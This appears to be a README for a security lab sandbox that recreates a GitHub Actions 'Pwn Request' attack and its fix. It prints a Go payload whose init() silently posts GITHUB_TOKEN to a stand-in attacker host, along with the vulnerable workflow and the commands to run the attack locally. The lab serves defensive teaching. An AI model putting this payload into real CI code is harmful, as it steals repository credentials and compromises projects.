# 🔐 Sandbox 1 — Pwn Request (avelino/awesome-go)

## 📋 Overview

| Property | Value |
|----------|-------|
| **Attack Type** | Pwn Request — `pull_request_target` + untrusted fork checkout |
| **Real Target** | avelino/awesome-go (140k+ stars) |
| **Attacker** | hackerbot-claw (Feb 28, 2026) |
| **Result** | ❌ GITHUB_TOKEN with write permissions exfiltrated |
| **Fixed** | ✅ Attack blocked with `pull_request` trigger |

---

## 📁 Structure
```
sandbox-1-pwn-request/
│
├── vulnerable/                          ← ATTACKED VERSION
│   └── .github/
│       ├── workflows/
│       │   └── pr-quality-check.yml    ← vulnerable workflow
│       └── scripts/check-quality/
│           └── main.go                 ← legitimate script (replaced by attacker)
│
├── fixed/                               ← SECURED VERSION
│   └── .github/
│       ├── workflows/
│       │   └── pr-quality-check.yml    ← hardened workflow
│       └── scripts/check-quality/
│           └── main.go                 ← legitimate script
│
└── attacker/
    └── payload/
        └── main.go                     ← malicious init() payload
```

---

## 🔄 Attack Flow
```
┌─────────────────────────────────────────────────────┐
│                   ATTACK FLOW                        │
├─────────────────────────────────────────────────────┤
│                                                      │
│   Attacker Fork PR                                   │
│          ↓                                           │
│   pull_request_target trigger                        │
│   (⚠️  secrets exposed to workflow)                  │
│          ↓                                           │
│   Checkout FORK code (attacker controls this)        │
│          ↓                                           │
│   go run executes malicious init()                   │
│   (runs AUTOMATICALLY before main())                 │
│          ↓                                           │
│   curl POST → GITHUB_TOKEN → attacker server         │
│          ↓                                           │
│   ❌ Token exfiltrated — repo compromised            │
│                                                      │
├─────────────────────────────────────────────────────┤
│                    THE FIX                           │
├─────────────────────────────────────────────────────┤
│                                                      │
│   Use pull_request trigger instead                   │
│   (✅ no secrets exposed)                            │
│          ↓                                           │
│   Checkout MAIN branch only                          │
│   (attacker fork code never executed)                │
│          ↓                                           │
│   ✅ Attack blocked                                  │
│                                                      │
└─────────────────────────────────────────────────────┘
```

---

## ⚠️ Vulnerability Conditions

Three conditions must be met simultaneously:
```yaml
# ⚠️ Condition 1: pull_request_target trigger
on:
  pull_request_target:
  # DANGER: gives workflow access to repository SECRETS
  # even when triggered by an untrusted external fork

# ⚠️ Condition 2: checkout of FORK code
- uses: actions/checkout@v3
  with:
    ref: ${{ github.event.pull_request.head.sha }}
    # DANGER: checks out ATTACKER'S code, not main branch

# ⚠️ Condition 3: execution of fork code with token
- run: go run ./.github/scripts/check-quality/
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    # DANGER: token is now accessible to attacker's script
```

---

## 💣 Malicious Payload

The attacker replaces the legitimate `main.go` with this poisoned version:
```go
package main

import (
    "fmt"
    "os"
    "os/exec"
)

// ⚠️ init() runs AUTOMATICALLY before main() — perfect camouflage
// The victim sees nothing suspicious in main()
func init() {
    // Read sensitive environment variables
    token := os.Getenv("GITHUB_TOKEN")  // ← the stolen secret
    repo  := os.Getenv("GITHUB_REPOSITORY")
    actor := os.Getenv("GITHUB_ACTOR")

    // Silently exfiltrate to attacker server
    exec.Command("sh", "-c",
        "curl -s -X POST" +
        " -d 'token=" + token +           // ← GITHUB_TOKEN sent here
        "&repo=" + repo +
        "&actor=" + actor + "'" +
        " http://attacker-server/exfil").Run()
}

// ✅ main() looks completely legitimate — camouflage
func main() {
    fmt.Println("Running quality checks...")
    fmt.Println("All checks passed!")
}
```

> 💡 **Why `init()`?** In Go, `init()` runs automatically before `main()`.
> The workflow output shows "All checks passed!" — the victim sees no error,
> while the token has already been silently exfiltrated.

---

## 📄 Event JSON

> 💡 **What is the Event JSON?**
> When running with `act` locally, we need to simulate a GitHub event.
> The `event.json` file mimics a real pull request from an **untrusted fork**,
> triggering the `pull_request_target` workflow exactly as a real attacker would.
```json
{
  "pull_request": {
    "head": {
      "sha": "abc123def456",
      "ref": "attacker-branch",
      "repo": {
        "full_name": "attacker/repo-fork"   ← untrusted fork
      }
    },
    "base": {
      "repo": {
        "full_name": "owner/repo"           ← target repository
      }
    },
    "number": 1
  },
  "repository": {
    "full_name": "owner/repo"
  }
}
```

---

## 🧪 Local Demonstration

> ⚠️ **Important Note:**
> This demonstration runs **entirely locally** using `act` and Docker.
> The real attacker domain is replaced with `localhost:8888`.
> No real secrets are sent anywhere outside your machine.

### Step 1 — Start exfiltration server
```bash
# Terminal 2 — keep this running
python exfil_server.py

# Expected output:
# Exfiltration server running on port 8888...
```

### Step 2 — Copy malicious payload
```bash
# Terminal 1
cp sandbox-1-pwn-request/attacker/payload/main.go \
   sandbox-1-pwn-request/vulnerable/.github/scripts/check-quality/main.go
```

### Step 3 ❌ — Run Vulnerable Version
```bash
act pull_request_target \
    --eventpath event.json \
    --secret-file .secrets \
    -W sandbox-1-pwn-request/vulnerable/.github/workflows/pr-quality-check.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Expected result Terminal 1:**
```
✅ Success - Main Run quality checks
| Running quality checks...
| All checks passed!          ← victim sees nothing suspicious
🏁 Job succeeded
```

**Expected result Terminal 2:**
```
==================================================
TOKEN EXFILTRATED!
Data: token=***&repo=owner/repo&actor=nektos/act
==================================================
❌ Attack succeeded — token stolen silently
```

### Step 4 ✅ — Run Fixed Version
```bash
act pull_request \
    --eventpath event.json \
    --secret-file .secrets \
    -W sandbox-1-pwn-request/fixed/.github/workflows/pr-quality-check.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Expected result Terminal 1:**
```
✅ Success - Main Run quality checks
| Running quality checks...
| All checks passed!
🏁 Job succeeded
```

**Expected result Terminal 2:**
```
(no request received)
✅ Attack blocked — nothing exfiltrated
```

---

## 🛠️ Applied Fix

| Element | ❌ Vulnerable | ✅ Fixed |
|---------|-------------|---------|
| Trigger | `pull_request_target` | `pull_request` |
| Permissions | `contents: write` | `contents: read` |
| Checkout | Fork code | Main branch only |
| Token | Exposed to script | Not exposed |
```yaml
# ✅ FIXED WORKFLOW
on:
  pull_request:               # ✅ no access to secrets

jobs:
  quality-check:
    permissions:
      contents: read          # ✅ minimum permissions only
    steps:
      - uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          # ✅ no ref: — checks out main branch only

      - run: go run ./.github/scripts/check-quality/
        # ✅ GITHUB_TOKEN not exposed to the script
```

---

## 🔑 Key Lesson

> ⚠️ **Never combine `pull_request_target` with a checkout of fork code.**
>
> `pull_request_target` gives the workflow access to repository secrets —
> this is intentional for trusted workflows that need to comment on PRs
> or post status checks. But if you also check out the fork's code and
> execute it, the attacker controls what runs with your secrets.
>
> ✅ **Rule:** If you use `pull_request_target`, never execute code from the fork.
> Always run code from your main branch only.

---

## 🔗 References

- [Real attack analysis — StepSecurity](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [Pwn Request — GitHub Security Lab](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [act — Local GitHub Actions runner](https://github.com/nektos/act)
